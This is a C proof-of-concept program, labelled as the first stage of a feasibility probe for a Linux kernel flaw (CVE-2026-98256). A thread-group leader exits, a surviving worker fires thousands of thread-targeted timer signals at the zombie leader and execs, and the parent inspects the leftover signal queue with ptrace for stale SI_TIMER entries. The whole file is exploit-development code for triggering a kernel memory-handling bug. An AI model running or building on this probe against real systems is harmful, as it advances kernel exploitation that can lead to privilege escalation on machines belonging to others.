/*
 * stage1 - CVE-2026-98256 feasibility probe.
 *
 * Leader exits (SYS_exit) leaving a worker; the worker queues SIGEV_THREAD_ID
 * timer signals into the zombie leader's private pending queue, then execs.
 * The parent then reads the surviving queue through PTRACE_PEEKSIGINFO and
 * looks for an SI_TIMER entry whose sigq should have been flushed.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <time.h>
#include <sched.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <fcntl.h>

#ifndef SIGEV_THREAD_ID
#define SIGEV_THREAD_ID 4
#endif

#define N_TIMERS 2048
#define BASE_SIG (SIGRTMIN + 2)

struct peeksiginfo_args_i { uint64_t off; uint32_t flags; int32_t nr; };

static pid_t g_leader_tid;
static int g_exe_fd = -1;
static int g_ready[2];
static int g_go[2];

static int pin_cpu(int c)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(c, &s);
    return sched_setaffinity(0, sizeof(s), &s);
}

static void *worker(void *a)
{
    static timer_t ids[N_TIMERS];
    struct sigevent sev;
    struct itimerspec its;
    int i, made = 0;
    char ch = 'x';
    (void)a;

    (void)ch;
    usleep(20000);                      /* let the leader finish exiting */

    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_THREAD_ID;
    sev.sigev_signo = BASE_SIG;
    sev._sigev_un._tid = (int)g_leader_tid;
    memset(&its, 0, sizeof(its));
    its.it_value.tv_nsec = 1;           /* expire immediately */
    for (i = 0; i < N_TIMERS; i++) {
        sev.sigev_signo = BASE_SIG + (i % 4);
        if (timer_create(CLOCK_MONOTONIC, &sev, &ids[i]) != 0) {
            if (i == 0) dprintf(2, "[worker] timer_create err=%d (%s) tid=%d notify=%d\n",
                                errno, strerror(errno), (int)g_leader_tid, (int)sev.sigev_notify);
            break;
        }
        if (timer_settime(ids[i], 0, &its, NULL) != 0) {
            if (i == 0) dprintf(2, "[worker] timer_settime err=%d (%s)\n", errno, strerror(errno));
            timer_delete(ids[i]); break;
        }
        made++;
    }
    dprintf(2, "[worker] timers=%d leader=%d\n", made, (int)g_leader_tid);
    (void)!write(g_ready[1], &made, sizeof(made));

    pin_cpu(0);
    {
        char *argv[] = { (char *)"stage1", (char *)"--exec-ok", NULL };
        char *envp[] = { NULL };
        /* a non-leader thread must not resolve /proc/self: the leader is a
         * zombie at this point, so exec through an fd opened earlier. */
        syscall(SYS_execveat, g_exe_fd, "", argv, envp, 0x1000 /* AT_EMPTY_PATH */);
        dprintf(2, "[worker] execveat err=%d (%s)\n", errno, strerror(errno));
        execve("/proc/thread-self/exe", argv, envp);
        dprintf(2, "[worker] execve err=%d (%s)\n", errno, strerror(errno));
    }
    _exit(2);
}

static int count_stale(pid_t pid, int max_off, int *n_timer)
{
    struct peeksiginfo_args_i args;
    siginfo_t si;
    int off, stale = 0;
    *n_timer = 0;
    for (off = 0; off < max_off; off++) {
        long r;
        memset(&si, 0, sizeof(si));
        args.off = (uint64_t)off; args.flags = 0; args.nr = 1;
        r = syscall(SYS_ptrace, PTRACE_PEEKSIGINFO, pid, &args, &si);
        if (r != 1) break;
        if (si.si_code == SI_TIMER) {
            (*n_timer)++;
            if ((si.si_value.sival_int & 0x00ffffff) != 0) stale++;
        }
    }
    return stale;
}

int main(int argc, char **argv)
{
    int run = argc > 1 ? atoi(argv[1]) : 1;
    int attempt;

    if (argc > 1 && !strcmp(argv[1], "--exec-ok")) {
        /* stay alive so the parent can attach and inspect the queue */
        for (;;) pause();
    }
    setvbuf(stdout, NULL, _IOLBF, 0);
    printf("=== stage1: CVE-2026-98256 feasibility ===\n");

    for (attempt = 0; attempt < run; attempt++) {
        pid_t child;
        sigset_t block;
        int st = 0, ntimer = 0, stale = 0;

        sigemptyset(&block);
        sigaddset(&block, BASE_SIG); sigaddset(&block, BASE_SIG + 1);
        sigaddset(&block, BASE_SIG + 2); sigaddset(&block, BASE_SIG + 3);
        sigprocmask(SIG_BLOCK, &block, NULL);   /* keep the sigqs queued */

        if (pipe(g_ready) || pipe(g_go)) return 1;
        child = fork();
        if (child == 0) {
            pthread_t th;
            close(g_ready[0]); close(g_go[1]);
            g_leader_tid = (pid_t)syscall(SYS_gettid);
            g_exe_fd = open("/proc/self/exe", O_RDONLY);
            int rc = pthread_create(&th, NULL, worker, NULL);
            if (rc != 0) {
                dprintf(2, "[child] pthread_create rc=%d\n", rc);
                _exit(3);
            }
            dprintf(2, "[child] leader tid=%d, exiting leader\n", (int)g_leader_tid);
            syscall(SYS_exit, 0);            /* leader leaves; worker survives */
            _exit(4);
        }
        close(g_ready[1]); close(g_go[0]);
        {
            fd_set rf; struct timeval tv; int made = 0, n;
            FD_ZERO(&rf); FD_SET(g_ready[0], &rf);
            tv.tv_sec = 3; tv.tv_usec = 0;
            if (select(g_ready[0] + 1, &rf, NULL, NULL, &tv) > 0)
                n = (int)read(g_ready[0], &made, sizeof(made)), (void)n;
            printf("  attempt %d: worker reported timers=%d\n", attempt, made);
        }
        usleep(250000);

        /* attach to the exec'd worker and peek its private pending queue */
        {
            char path[64], buf[512]; int fd, n = -1;
            snprintf(path, sizeof(path), "/proc/%d/stat", (int)child);
            fd = open(path, O_RDONLY);
            if (fd >= 0) { n = (int)read(fd, buf, sizeof(buf) - 1); close(fd); }
            if (n > 0) { buf[n] = 0; printf("  child stat: %.90s\n", buf); }
            else printf("  child stat unreadable (%s)\n", strerror(errno));
        }
        errno = 0;
        if (ptrace(PTRACE_ATTACH, child, 0, 0) == 0) {
            waitpid(child, &st, 0);
            stale = count_stale(child, 4096, &ntimer);
            printf("  attempt %d: pending SI_TIMER=%d stale=%d status=0x%x\n",
                   attempt, ntimer, stale, st);
            ptrace(PTRACE_DETACH, child, 0, 0);
        } else {
            printf("  attempt %d: attach failed errno=%d (%s) child=%d\n",
                   attempt, errno, strerror(errno), (int)child);
        }
        kill(child, SIGKILL);
        waitpid(child, &st, 0);
    }
    printf("stage1 done\n");
    return 0;
}
